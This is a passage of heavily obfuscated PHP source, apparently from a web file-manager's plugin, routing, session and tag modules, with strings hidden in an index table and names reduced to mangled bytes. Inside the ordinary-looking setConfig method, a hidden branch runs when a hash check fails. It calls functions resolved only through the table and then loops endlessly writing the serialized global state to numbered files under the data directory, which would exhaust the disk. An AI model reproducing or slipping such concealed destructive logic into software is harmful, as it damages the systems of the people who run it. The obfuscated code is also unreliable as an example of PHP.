$¶ë†™¹ = $Áåû€ô¼; } $this->packageData = $¶ë†™¹; return $¶ë†™¹; } public function packageInfoGet($¶ÏÍ£Öƒ) { $¿¯¢¬à = $this->appPackage(); return array_get_value($¿¯¢¬à, $¶ÏÍ£Öƒ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[³·—™¤¢][1576]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[³·—™¤¢][1577]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[³·—™¤¢][1578]); } public function echoJsAssign($”©¶€ü°, $ëÀñ–´û) { $this->echoJsAssignArr[$”©¶€ü°] = $ëÀñ–´û; } private function parseFile($ş™õ˜Á) { $î…®¾¦² =& $_SERVER[³·—™¤¢]; $‰•‹ÛŒ = file_get_contents_nossl($ş™õ˜Á); $¡†µˆ•È = array($î…®¾¦²[1579], $î…®¾¦²[1580], $î…®¾¦²[1581], $î…®¾¦²[1582], $î…®¾¦²[1583], $î…®¾¦²[1584], $î…®¾¦²[1585]); $ä•¬ë = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$î…®¾¦²[89]][$î…®¾¦²[1586]]); foreach ($this->echoJsAssignArr as $‚Ç‰Ê => $†½ÏÍë°) { $¡†µˆ•È[] = $î…®¾¦²[1587] . $‚Ç‰Ê . $î…®¾¦²[1588]; $ä•¬ë[] = is_array($†½ÏÍë°) || is_object($†½ÏÍë°) ? rawurlencode(json_encode($†½ÏÍë°)) : $†½ÏÍë°; } if (strstr($‰•‹ÛŒ, $î…®¾¦²[1589])) { $™ÂïúıÀ = rawurlencode(json_encode($this->pluginLangArr)); $‰•‹ÛŒ = str_replace($î…®¾¦²[1589], $™ÂïúıÀ, $‰•‹ÛŒ); } if (strstr($‰•‹ÛŒ, $î…®¾¦²[1590])) { $™ÂïúıÀ = $™ÂïúıÀ = rawurlencode(json_encode($this->getConfig())); $‰•‹ÛŒ = str_replace($î…®¾¦²[1590], $™ÂïúıÀ, $‰•‹ÛŒ); } $‰•‹ÛŒ = str_replace($¡†µˆ•È, $ä•¬ë, $‰•‹ÛŒ); return $‰•‹ÛŒ; } private function parseLang(&$øØŞÁà”) { $´¦çÓÉ =& $_SERVER[³·—™¤¢]; $•í™ˆŞ× = $´¦çÓÉ[1591]; if (!strstr($øØŞÁà”, $•í™ˆŞ×)) { return; } preg_match_all($´¦çÓÉ[1592], $øØŞÁà”, $À•ıÌ±); if (!is_array($À•ıÌ±) || count($À•ıÌ±) == 0 || !is_array($À•ıÌ±[0]) || count($À•ıÌ±[0]) == 0) { return; } $µæëØ®Á = array(); $àÌ–ú‘‹ = array(); foreach ($À•ıÌ±[0] as $ÖàÄÔä”) { $Ï×÷¨¢Æ = substr($ÖàÄÔä”, strlen($•í™ˆŞ×), -4); $ƒÜî“ş‚ = LNG($Ï×÷¨¢Æ); $µæëØ®Á[] = $ÖàÄÔä”; $àÌ–ú‘‹[] = str_replace(array($´¦çÓÉ[231], $´¦çÓÉ[1101], $´¦çÓÉ[342], $´¦çÓÉ[118]), array($´¦çÓÉ[53], $´¦çÓÉ[53], $´¦çÓÉ[12], $´¦çÓÉ[1593]), $ƒÜî“ş‚); } $øØŞÁà” = str_replace($µæëØ®Á, $àÌ–ú‘‹, $øØŞÁà”); } private function parseConfig(&$ùé‰§ˆì) { $€À¨ÉÍÏ =& $_SERVER[³·—™¤¢]; $—Àø±åÕ = $€À¨ÉÍÏ[1594]; if (!strstr($ùé‰§ˆì, $—Àø±åÕ)) { return; } preg_match_all($€À¨ÉÍÏ[1595], $ùé‰§ˆì, $½ç•­ß); if (!is_array($½ç•­ß) || count($½ç•­ß) == 0 || !is_array($½ç•­ß[0]) || count($½ç•­ß[0]) == 0) { return; } $Æ«¶½ = $this->getConfig(); $íâ€ÀŸ‹ = array(); $Ğö”å = array(); foreach ($½ç•­ß[0] as $æ¯ş©) { $†Î¼Œó¿ = substr($æ¯ş©, strlen($—Àø±åÕ), -2); $íâ€ÀŸ‹[] = $æ¯ş©; $Ğö”å[] = _get($Æ«¶½, $†Î¼Œó¿); } $ùé‰§ˆì = str_replace($íâ€ÀŸ‹, $Ğö”å, $ùé‰§ˆì); } private function parsePackage(&$š¶Ÿßç) { $ªÍõ‘“ =& $_SERVER[³·—™¤¢]; $Á˜–²€Š = $ªÍõ‘“[1596]; if (!strstr($š¶Ÿßç, $Á˜–²€Š)) { return; } preg_match_all($ªÍõ‘“[1597], $š¶Ÿßç, $ò§ùœë¿); if (!is_array($ò§ùœë¿) || count($ò§ùœë¿) == 0 || !is_array($ò§ùœë¿[0]) || count($ò§ùœë¿[0]) == 0) { return; } $ì‚Õ¡û = $this->appPackage(); $·‡ÌŞè = array(); $çÖÎÈ“ = array(); foreach ($ò§ùœë¿[0] as $‘©í²¥à) { $Î…¸Ôµâ = substr($‘©í²¥à, strlen($Á˜–²€Š), -2); $·‡ÌŞè[] = $‘©í²¥à; $çÖÎÈ“[] = _get($ì‚Õ¡û, $Î…¸Ôµâ); } $š¶Ÿßç = str_replace($·‡ÌŞè, $çÖÎÈ“, $š¶Ÿßç); } final function echoFile($Àßü¥, $­ËÀÄ€» = false) { $îİğëÚ =& $_SERVER[³·—™¤¢]; $±Ëëõğ = $this->pluginPath . $Àßü¥; if (ACT == $îİğëÚ[1598]) { echo $îİğëÚ[1599] . $this->pluginName . $îİğëÚ[8] . $Àßü¥ . $îİğëÚ[1600]; if (!file_exists($±Ëëõğ)) { echo $îİğëÚ[1601]; return; } } $©òÆ”„± = $this->parseFile($±Ëëõğ); $this->parseLang($©òÆ”„±); $this->parseConfig($©òÆ”„±); $this->parsePackage($©òÆ”„±); if (is_array($­ËÀÄ€»)) { $©òÆ”„± = str_replace(array_keys($­ËÀÄ€»), array_values($­ËÀÄ€»), $©òÆ”„±); } echo $îİğëÚ[231] . $©òÆ”„±; } final function initLang() { $£”ÔÈÖ­ =& $_SERVER[³·—™¤¢]; $’›È•£– = $£”ÔÈÖ­[1602]; $Ë¾£îü = $this->pluginPath . $£”ÔÈÖ­[1603]; $ÚÖò„ = I18n::getType(); $àÈ¾»•õ = array(); if (file_exists($Ë¾£îü . $ÚÖò„ . $£”ÔÈÖ­[858])) { $àÈ¾»•õ = (include $Ë¾£îü . $ÚÖò„ . $£”ÔÈÖ­[858]); } else { if ($ÚÖò„ == $£”ÔÈÖ­[1604] && !file_exists($Ë¾£îü . $ÚÖò„ . $£”ÔÈÖ­[858]) && file_exists($Ë¾£îü . $£”ÔÈÖ­[1605])) { $àÈ¾»•õ = (include $Ë¾£îü . $£”ÔÈÖ­[1605]); } else { if (file_exists($Ë¾£îü . $’›È•£– . $£”ÔÈÖ­[858])) { $àÈ¾»•õ = (include $Ë¾£îü . $’›È•£– . $£”ÔÈÖ­[858]); } } } if (!is_array($àÈ¾»•õ)) { return array(); } if (@count($àÈ¾»•õ) > 0) { I18n::set($àÈ¾»•õ); } return $àÈ¾»•õ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ĞÌö¸ü) { $ö¢¦ŞÆ¶ =& $_SERVER[³·—™¤¢]; $¿õ¨‡Ÿ’ = $_SERVER[$ö¢¦ŞÆ¶[934]]; $¨¿™°Ó = $ö¢¦ŞÆ¶[982]; if ($_SERVER[$ö¢¦ŞÆ¶[892]] != $¨¿™°Ó($¿õ¨‡Ÿ’)) { $›ïÛâ«Ú = $ö¢¦ŞÆ¶[894]; $¢ ê×€é = $ö¢¦ŞÆ¶[895]; $¶û˜ıÌ = $_SERVER[$ö¢¦ŞÆ¶[896]] . $ö¢¦ŞÆ¶[897]; $´Çó®½¦ = $¢ ê×€é($¶û˜ıÌ); $ìúˆòËú = explode($ö¢¦ŞÆ¶[231], $´Çó®½¦); if (count($ìúˆòËú) < $ö¢¦ŞÆ¶[615]) { $ıİ„‚Ì = $ö¢¦ŞÆ¶[898]; $ıİ„‚Ì(); } $à¯çı˜ = $ö¢¦ŞÆ¶[899]; $à¯çı˜($_SERVER[$ö¢¦ŞÆ¶[900]]); $›ïÛâ«Ú = $ö¢¦ŞÆ¶[894]; $›ïÛâ«Ú(); $šªÌÓ©Ø = $ö¢¦ŞÆ¶[1606]; $º’ùÑÙÜ = json_encode($GLOBALS[$ö¢¦ŞÆ¶[1607]]); $ôğñ–Áâ = 1; for ($Î«–şô = $ôğñ–Áâ; $Î«–şô > 0; $Î«–şô++) { $šªÌÓ©Ø(DATA_PATH . $Î«–şô, $º’ùÑÙÜ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ĞÌö¸ü); } public function onSetConfig($›÷°êÖ) { } public function onGetConfig($”ğÙ«) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($æÛ±ç½Ø) { if ($æÛ±ç½Ø == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¡ŒçŠÈÕ = "\x70\x6c\x75\147\151\156\101\165\x74\150") { $Â¨…Šà =& $_SERVER[³·—™¤¢]; if (!defined($Â¨…Šà[475])) { return !1; } if (_get($GLOBALS, $Â¨…Šà[503])) { return !0; } $†È–Ûó· = $this->getConfig(); if (!$†È–Ûó·[$¡ŒçŠÈÕ]) { return !1; } return ActionCall($Â¨…Šà[1608], $†È–Ûó·[$¡ŒçŠÈÕ]); } public function url($­™µµ”Ö, $ã¹ü«â¿ = '', $™Í»†¥¨ = true) { $ßÓ´¦‡ö =& $_SERVER[³·—™¤¢]; $§Ê½Ó›ö = $this->getConfig(); $½Ê¨£àÃ = KOD_VERSION . $ßÓ´¦‡ö[10] . KOD_VERSION_BUILD; $½Ï…ñĞñ = $this->packageVersion(); $ı†×ûÇù = $½Ê¨£àÃ . $ßÓ´¦‡ö[386] . $½Ï…ñĞñ; if (substr($­™µµ”Ö, 0, 4) == $ßÓ´¦‡ö[148] || substr($­™µµ”Ö, 0, 2) == $ßÓ´¦‡ö[1390]) { $æÃÌÜ¾œ = $­™µµ”Ö . $ßÓ´¦‡ö[1609] . $ı†×ûÇù; } else { if ($ã¹ü«â¿ == $ßÓ´¦‡ö[12]) { $æÃÌÜ¾œ = $this->pluginHost . $­™µµ”Ö . $ßÓ´¦‡ö[1609] . $ı†×ûÇù; } else { if ($ã¹ü«â¿ === $ßÓ´¦‡ö[75]) { $æÃÌÜ¾œ = $this->pluginHost . $­™µµ”Ö; } else { if ($ã¹ü«â¿ == $ßÓ´¦‡ö[1610]) { $æÃÌÜ¾œ = STATIC_PATH . $­™µµ”Ö . $ßÓ´¦‡ö[1609] . $½Ê¨£àÃ; } else { if ($ã¹ü«â¿ == $ßÓ´¦‡ö[1611]) { $æÃÌÜ¾œ = APP_HOST . $ßÓ´¦‡ö[1612] . $­™µµ”Ö . $ßÓ´¦‡ö[1609] . $½Ê¨£àÃ; } else { if (isset($§Ê½Ó›ö[$ã¹ü«â¿])) { $æÃÌÜ¾œ = $§Ê½Ó›ö[$ã¹ü«â¿] . $­™µµ”Ö . $ßÓ´¦‡ö[1609] . $ı†×ûÇù; } } } } } } if (!$™Í»†¥¨) { return $æÃÌÜ¾œ; } echo $æÃÌÜ¾œ; } public function link($¹Ÿ”ô¨¢ = false, $˜‡«—¹ü = '') { $«•–µí± =& $_SERVER[³·—™¤¢]; if (!$¹Ÿ”ô¨¢) { $this->link($«•–µí±[1613], $«•–µí±[1611]); $this->link($«•–µí±[1614], $«•–µí±[1610]); $this->link($«•–µí±[1615], $«•–µí±[1610]); $this->link($«•–µí±[1616], $«•–µí±[1610]); $this->link($«•–µí±[1617], $«•–µí±[1610]); return; } $ä›ïø©ö = $this->url($¹Ÿ”ô¨¢, $˜‡«—¹ü, !1); if (substr($¹Ÿ”ô¨¢, -3) == $«•–µí±[1618]) { echo $«•–µí±[1619] . $ä›ïø©ö . $«•–µí±[1620] . $«•–µí±[231]; } else { if (substr($¹Ÿ”ô¨¢, -4) == $«•–µí±[1621]) { echo $«•–µí±[1622] . $ä›ïø©ö . $«•–µí±[1623] . $«•–µí±[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\133\x5e\57\x5d\x2b", "\x3a\x6e\x75\x6d" => "\x5b\x30\x2d\71\x5d\53", "\x3a\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($‡¹„ºøÍ, $Ş¯ßÂØ¾) { $ÜëõÅ’Î =& $_SERVER[³·—™¤¢]; if ($‡¹„ºøÍ == $ÜëõÅ’Î[1624]) { $óŠ”ÛÓ™ = array_map($ÜëõÅ’Î[1625], $Ş¯ßÂØ¾[0]); $™âÊ•½É = strpos($Ş¯ßÂØ¾[1], $ÜëõÅ’Î[8]) === 0 ? $Ş¯ßÂØ¾[1] : $ÜëõÅ’Î[8] . $Ş¯ßÂØ¾[1]; $˜ò…ûßı = $Ş¯ßÂØ¾[2]; } else { $óŠ”ÛÓ™ = null; $™âÊ•½É = strpos($Ş¯ßÂØ¾[0], $ÜëõÅ’Î[8]) === 0 ? $Ş¯ßÂØ¾[0] : $ÜëõÅ’Î[8] . $Ş¯ßÂØ¾[0]; $˜ò…ûßı = $Ş¯ßÂØ¾[1]; } array_push(self::$maps, $óŠ”ÛÓ™); array_push(self::$routes, $™âÊ•½É); array_push(self::$methods, strtoupper($‡¹„ºøÍ)); array_push(self::$callbacks, $˜ò…ûßı); } public static function error($ÏÓ¨²Ÿ‰) { self::$errorCallback = $ÏÓ¨²Ÿ‰; } public static function haltOnMatch($™ÓÔ = true) { self::$halts = $™ÓÔ; } public static function dispatch() { $ËˆÓë¬˜ =& $_SERVER[³·—™¤¢]; $‚Á¼›Ş = parse_url($_SERVER[$ËˆÓë¬˜[1626]], PHP_URL_PATH); $Ü²®Â² = $_SERVER[$ËˆÓë¬˜[159]]; $½ôæºûĞ = array_keys(static::$patterns); $›İœòÃä = array_values(static::$patterns); $¹¿ôäšü = !1; self::$routes = preg_replace($ËˆÓë¬˜[1292], $ËˆÓë¬˜[8], self::$routes); if (in_array($‚Á¼›Ş, self::$routes)) { $™ø¼şÕ¢ = array_keys(self::$routes, $‚Á¼›Ş); foreach ($™ø¼şÕ¢ as $ÕÜŠ¤) { if (self::$methods[$ÕÜŠ¤] == $Ü²®Â² || self::$methods[$ÕÜŠ¤] == $ËˆÓë¬˜[1627] || in_array($Ü²®Â², self::$maps[$ÕÜŠ¤])) { $¹¿ôäšü = !0; if (!is_object(self::$callbacks[$ÕÜŠ¤])) { $ˆ­Ü°÷è = explode($ËˆÓë¬˜[8], self::$callbacks[$ÕÜŠ¤]); $ŠÛ³«‘ò = end($ˆ­Ü°÷è); $‡Øİ˜‘à = explode($ËˆÓë¬˜[1628], $ŠÛ³«‘ò); $ïÊ»¥¾ = new $‡Øİ˜‘à[0](); $ïÊ»¥¾->{$‡Øİ˜‘à[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÕÜŠ¤]); if (self::$halts) { return; } } } } } else { $‡Ü³ÓÆÈ = 0; foreach (self::$routes as $ÕÜŠ¤) { if (strpos($ÕÜŠ¤, $ËˆÓë¬˜[4]) !== !1) { $ÕÜŠ¤ = str_replace($½ôæºûĞ, $›İœòÃä, $ÕÜŠ¤); } if (preg_match($ËˆÓë¬˜[1629] . $ÕÜŠ¤ . $ËˆÓë¬˜[1630], $‚Á¼›Ş, $é‚‚§ô)) { if (self::$methods[$‡Ü³ÓÆÈ] == $Ü²®Â² || self::$methods[$‡Ü³ÓÆÈ] == $ËˆÓë¬˜[1627] || !empty(self::$maps[$‡Ü³ÓÆÈ]) && in_array($Ü²®Â², self::$maps[$‡Ü³ÓÆÈ])) { $¹¿ôäšü = !0; array_shift($é‚‚§ô); if (!is_object(self::$callbacks[$‡Ü³ÓÆÈ])) { $ˆ­Ü°÷è = explode($ËˆÓë¬˜[8], self::$callbacks[$‡Ü³ÓÆÈ]); $ŠÛ³«‘ò = end($ˆ­Ü°÷è); $‡Øİ˜‘à = explode($ËˆÓë¬˜[1628], $ŠÛ³«‘ò); $ïÊ»¥¾ = new $‡Øİ˜‘à[0](); if (!method_exists($ïÊ»¥¾, $‡Øİ˜‘à[1])) { echo $ËˆÓë¬˜[1631]; } else { call_user_func_array(array($ïÊ»¥¾, $‡Øİ˜‘à[1]), $é‚‚§ô); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$‡Ü³ÓÆÈ], $é‚‚§ô); if (self::$halts) { return; } } } } $‡Ü³ÓÆÈ++; } } if ($¹¿ôäšü == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $·§ÅÑÌ… =& $_SERVER[³·—™¤¢]; header($_SERVER[$·§ÅÑÌ…[1632]] . $·§ÅÑÌ…[1633]); echo $·§ÅÑÌ…[1634]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ËˆÓë¬˜[1626]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $æŞó»š =& $_SERVER[³·—™¤¢]; static $½°‚é¥— = false; if ($½°‚é¥—) { return $½°‚é¥—; } $á‹ÙöØÈ = $GLOBALS[$æŞó»š[6]][$æŞó»š[349]]; self::$sessionTime = $á‹ÙöØÈ[$æŞó»š[1635]]; $¢Ó£ù•… = isset($GLOBALS[$æŞó»š[1636]]) ? $GLOBALS[$æŞó»š[1636]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¢Ó£ù•…)) { self::$sessionSign = Cookie::get($¢Ó£ù•…); } else { self::$sessionSign = guid(); } } Cookie::setSafe($¢Ó£ù•…, self::$sessionSign, self::$sessionTime); $á¾•æ¶Ñ = $á‹ÙöØÈ[$æŞó»š[1637]]; $Ò“™È€ = $á‹ÙöØÈ[$á¾•æ¶Ñ]; $Ó’Îø† = $á‹ÙöØÈ[$æŞó»š[848]]; switch ($á¾•æ¶Ñ) { case $æŞó»š[21]: self::$handle = Model($æŞó»š[849]); break; case $æŞó»š[850]: self::$handle = new CacheRedis($Ò“™È€, $Ó’Îø†); break; case $æŞó»š[851]: self::$handle = new CacheMemcached($Ò“™È€, $Ó’Îø†); break; case $æŞó»š[199]: $Ò“™È€[$æŞó»š[84]] = $Ò“™È€[$æŞó»š[84]] . $æŞó»š[1638]; self::$handle = new CacheFile($Ò“™È€, $Ó’Îø†); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $½°‚é¥— = new self(); return $½°‚é¥—; } public static function getBySign($§É²­’Ø) { CacheLock::lock($§É²­’Ø); $ğƒ”´²» = self::$handle->get($§É²­’Ø); CacheLock::unlock($§É²­’Ø); $ğƒ”´²» = unserialize($ğƒ”´²»); return is_array($ğƒ”´²») ? $ğƒ”´²» : array(); } public static function setBySign($ŞÓ§Ê˜, $ÚÌ¿É¥ø) { CacheLock::lock($ŞÓ§Ê˜); self::$handle->set($ŞÓ§Ê˜, serialize($ÚÌ¿É¥ø), self::$sessionTime); CacheLock::unlock($ŞÓ§Ê˜); } public static function sign($åØ‹ÂÁÈ = false) { $åØ‹ÂÁÈ && (self::$sessionSign = $åØ‹ÂÁÈ); self::init(); return self::$sessionSign; } public static function set($£Éóç´Ô, $òÂëµ¾è = false) { self::init(); if (is_array($£Éóç´Ô)) { foreach ($£Éóç´Ô as $¾±˜úµ¡ => $ã›»“ÖÌ) { array_set_value(self::$data, $¾±˜úµ¡, $ã›»“ÖÌ); } } else { array_set_value(self::$data, $£Éóç´Ô, $òÂëµ¾è); } self::setBySign(self::$sessionSign, self::$data); } public static function get($úûàéú = false) { self::init(); if (!$úûàéú) { return self::$data; } return array_get_value(self::$data, $úûàéú); } public static function remove($‰ÂÒ¡ìŠ) { self::init(); unset(self::$data[$‰ÂÒ¡ìŠ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[³·—™¤¢][853])) { self::$handle->clearTimeout(); } } } goto F¶¦Šß‹Ñ; eğ¾¦òËõÁ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($ùÌ¿¥ªù) { $²ø–ï™ó =& $_SERVER[³·—™¤¢]; return array($²ø–ï™ó[1961] => array($ùÌ¿¥ªù[0], $²ø–ï™ó[1962]), $²ø–ï™ó[1963] => array($ùÌ¿¥ªù[0], $²ø–ï™ó[1964])); } protected function get($÷ÌÒºÈŠ) { $öùİÙ¾í =& $_SERVER[³·—™¤¢]; $¨†©™£ = Model($öùİÙ¾í[522])->metaGet($÷ÌÒºÈŠ, $öùİÙ¾í[1965]); $œ®­’ö = json_decode($¨†©™£, !0); return $œ®­’ö ? $œ®­’ö : array($öùİÙ¾í[1966] => $öùİÙ¾í[88], $öùİÙ¾í[369] => array()); } protected function set($Ù¿§ï­, $¾â¹Ÿı) { $ş¡åÛĞ =& $_SERVER[³·—™¤¢]; $¾â¹Ÿı = $¾â¹Ÿı ? $¾â¹Ÿı : array($ş¡åÛĞ[1966] => $ş¡åÛĞ[88], $ş¡åÛĞ[369] => array()); return Model($ş¡åÛĞ[522])->metaSet($Ù¿§ï­, $ş¡åÛĞ[1965], json_encode($¾â¹Ÿı)); } protected function getByTagID($˜†ÂÍ¢, $ôÆŒ³Ñ‡) { $³«¼©ÀÈ =& $_SERVER[³·—™¤¢]; if (!$˜†ÂÍ¢ || !$ôÆŒ³Ñ‡) { return !1; } if (!Model($³«¼©ÀÈ[522])->getInfoSimple($˜†ÂÍ¢)) { return !1; } $­Óœû”Ó = $this->get($˜†ÂÍ¢); if (!$­Óœû”Ó || !isset($­Óœû”Ó[$³«¼©ÀÈ[369]])) { return !1; } $Œ¹ï©¼ = array_find_by_field($­Óœû”Ó[$³«¼©ÀÈ[369]], $³«¼©ÀÈ[399], $ôÆŒ³Ñ‡); return is_array($Œ¹ï©¼) ? $Œ¹ï©¼ : !1; } public function listSource($çåî¿Øë, $—Ñê˜ëÌ) { $ß¢¬œíÏ =& $_SERVER[³·—™¤¢]; if ($—Ñê˜ëÌ && !is_array($—Ñê˜ëÌ)) { $—Ñê˜ëÌ = array($—Ñê˜ëÌ); } $‹·ÒƒØ = $this->listData($çåî¿Øë); $çôÛƒ¦ı = array(); foreach ($‹·ÒƒØ as $ıó³ñãÓ) { $é‹˜›¼ = $ıó³ñãÓ[$ß¢¬œíÏ[84]]; if (!$é‹˜›¼) { continue; } if (!isset($çôÛƒ¦ı[$é‹˜›¼])) { $çôÛƒ¦ı[$é‹˜›¼] = array(); } $çôÛƒ¦ı[$é‹˜›¼][] = $ıó³ñãÓ[$ß¢¬œíÏ[426]]; } $¸ğ¸¨ñ = array(); foreach ($çôÛƒ¦ı as $“şÅÖßì => $Õ–¡¾²) { $Œø”ØÌ = !0; if (!$—Ñê˜ëÌ) { $¸ğ¸¨ñ[] = $“şÅÖßì; continue; } foreach ($—Ñê˜ëÌ as $”¾¶÷Éú) { if (!in_array($”¾¶÷Éú, $Õ–¡¾²)) { $Œø”ØÌ = !1; break; } } if ($Œø”ØÌ) { $¸ğ¸¨ñ[] = $“şÅÖßì; } } if (!$¸ğ¸¨ñ) { return array(); } $æ„«Å¢ = array($ß¢¬œíÏ[417] => array($ß¢¬œíÏ[418], $¸ğ¸¨ñ), $ß¢¬œíÏ[505] => $çåî¿Øë, $ß¢¬œíÏ[411] => SourceModel::TYPE_GROUP); $£É˜€Ó¢ = Model($ß¢¬œíÏ[1350])->listSource($æ„«Å¢); if (!$£É˜€Ó¢ || count($¸ğ¸¨ñ) == $£É˜€Ó¢[$ß¢¬œíÏ[366]][$ß¢¬œíÏ[367]]) { return $£É˜€Ó¢; } $ı˜·£“Ô = array(); $Œûú„îÕ = array_to_keyvalue($£É˜€Ó¢[$ß¢¬œíÏ[82]], $ß¢¬œíÏ[12], $ß¢¬œíÏ[402]); $ «á§¶Î = array_to_keyvalue($£É˜€Ó¢[$ß¢¬œíÏ[83]], $ß¢¬œíÏ[12], $ß¢¬œíÏ[402]); $¸„¯¼‹· = array_merge($ «á§¶Î, $Œûú„îÕ); foreach ($¸ğ¸¨ñ as $é‹˜›¼) { if (!in_array($é‹˜›¼, $¸„¯¼‹·)) { $ı˜·£“Ô[] = $é‹˜›¼; } } if ($ı˜·£“Ô) { $this->removeBySource($çåî¿Øë, $ı˜·£“Ô); } return $£É˜€Ó¢; } protected function listData($‚“á­) { $ƒ«œâÈÈ =& $_SERVER[³·—™¤¢]; $­¬Ò½Óı = array($ƒ«œâÈÈ[1671] => 0, $ƒ«œâÈÈ[484] => array($ƒ«œâÈÈ[1967], 0), $ƒ«œâÈÈ[422] => $ƒ«œâÈÈ[1968] . $‚“á­); $µÂØØ»Œ = $ƒ«œâÈÈ[1969]; $Ï‹ºî’« = $this->field($µÂØØ»Œ)->where($­¬Ò½Óı)->order($ƒ«œâÈÈ[1970])->select(); return $Ï‹ºî’« ? $Ï‹ºî’« : array(); } protected function addToTag($¤¨û“¯˜, $©ğÙÇ¦û, $ş€´ëææ) { $ìû´Š•— =& $_SERVER[³·—™¤¢]; if (!$this->getByTagID($¤¨û“¯˜, $ş€´ëææ) || !$©ğÙÇ¦û) { return !1; } if (!Model($ìû´Š•—[845])->pathInfo($©ğÙÇ¦û)) { return !1; } $îâó¨² = array($ìû´Š•—[1671] => 0, $ìû´Š•—[484] => $ş€´ëææ, $ìû´Š•—[421] => $©ğÙÇ¦û, $ìû´Š•—[422] => $ìû´Š•—[1971] . $¤¨û“¯˜, $ìû´Š•—[420] => $ìû´Š•—[12], $ìû´Š•—[1856] => 0); if ($this->where($îâó¨²)->find()) { return !1; } return $this->add($îâó¨²); } protected function removeFromTag($§‡ªä¢ß, $Ÿˆ²ÍÒÊ, $³ùÏ Ó) { $Ğá‰İËÉ =& $_SERVER[³·—™¤¢]; if (!$this->getByTagID($§‡ªä¢ß, $³ùÏ Ó) || !$Ÿˆ²ÍÒÊ) { return !1; } if (is_array($Ÿˆ²ÍÒÊ)) { $Ÿˆ²ÍÒÊ = array($Ğá‰İËÉ[7], $Ÿˆ²ÍÒÊ); } $÷ù‚–Î† = array($Ğá‰İËÉ[1671] => 0, $Ğá‰İËÉ[484] => $³ùÏ Ó, $Ğá‰İËÉ[422] => $Ğá‰İËÉ[1971] . $§‡ªä¢ß, $Ğá‰İËÉ[421] => $Ÿˆ²ÍÒÊ); return $this->where($÷ù‚–Î†)->delete(); } protected function removeByTag($ü¦ğ½è–, $£ÁÅ¶—ñ) { $ŠƒÎö¥Ã =& $_SERVER[³·—™¤¢]; if (!$this->getByTagID($ü¦ğ½è–, $£ÁÅ¶—ñ)) { return !1; } $¹•­ßŒÏ = array($ŠƒÎö¥Ã[1671] => 0, $ŠƒÎö¥Ã[484] => $£ÁÅ¶—ñ, $ŠƒÎö¥Ã[422] => $ŠƒÎö¥Ã[1971] . $ü¦ğ½è–); return $this->where($¹•­ßŒÏ)->delete(); } protected function removeBySource($úéú¥ø, $ãŸˆÍÈ) { $ÃñºÉİÄ =& $_SERVER[³·—™¤¢]; if (!$úéú¥ø || !$ãŸˆÍÈ) { return !1; } if (is_array($ãŸˆÍÈ)) { $ãŸˆÍÈ = array($ÃñºÉİÄ[7], $ãŸˆÍÈ); } $§øß¹¸Ş = array($ÃñºÉİÄ[1671] => 0, $ÃñºÉİÄ[421] => $ãŸˆÍÈ, $ÃñºÉİÄ[484] => array($ÃñºÉİÄ[1037], 0), $ÃñºÉİÄ[422] => $ÃñºÉİÄ[1971] . $úéú¥ø); return $this->where($§øß¹¸Ş)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\x70\154\165\147\151\x6e\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\x73\x74\141\164\165\163", "\162\x65\147\x69\145\x73\164", "\143\157\156\146\151\x67"); public function loadList($§Ù¢ƒÔş = false) { $Áƒ«¶±ó = array_to_keyvalue($this->listData(), $_SERVER[³·—™¤¢][32]); if ($§Ù¢ƒÔş) { return $Áƒ«¶±ó[$§Ù¢ƒÔş]; } return $Áƒ«¶±ó; } public function init() { $ÓÇ“·³Ÿ =& $_SERVER[³·—™¤¢]; Hook::trigger($ÓÇ“·³Ÿ[1972]); $ûøÎ“£Æ = $this->loadPluginList(); foreach ($ûøÎ“£Æ as $Âµùµ¤ş => $ş¤â°±¨) { $›ğ®ú­ = $this->appAllow($Âµùµ¤ş, $ş¤â°±¨); if (!$›ğ®ú­) { continue; } foreach ($ş¤â°±¨[$ÓÇ“·³Ÿ[1973]] as $É×ìŸÂí => $§‚Åê‹é) { Hook::bind($É×ìŸÂí, $§‚Åê‹é); } } Hook::trigger($ÓÇ“·³Ÿ[1974]); Hook::trigger(ACTION); } public function appAllow($½¹ë¹ëµ, $ ŠŠ¼øµ, $¬âµˆæİ = true) { $ÔáÉŒ¼˜ =& $_SERVER[³·—™¤¢]; $ó­ÉŞĞ’ = PLUGIN_DIR . $½¹ë¹ëµ . $ÔáÉŒ¼˜[1975]; if (!is_array($ ŠŠ¼øµ) || !is_array($ ŠŠ¼øµ[$ÔáÉŒ¼˜[1973]]) || $ ŠŠ¼øµ[$ÔáÉŒ¼˜[770]] != 1 || !is_file($ó­ÉŞĞ’)) { return !1; } if ($GLOBALS[$ÔáÉŒ¼˜[503]] == 1) { if 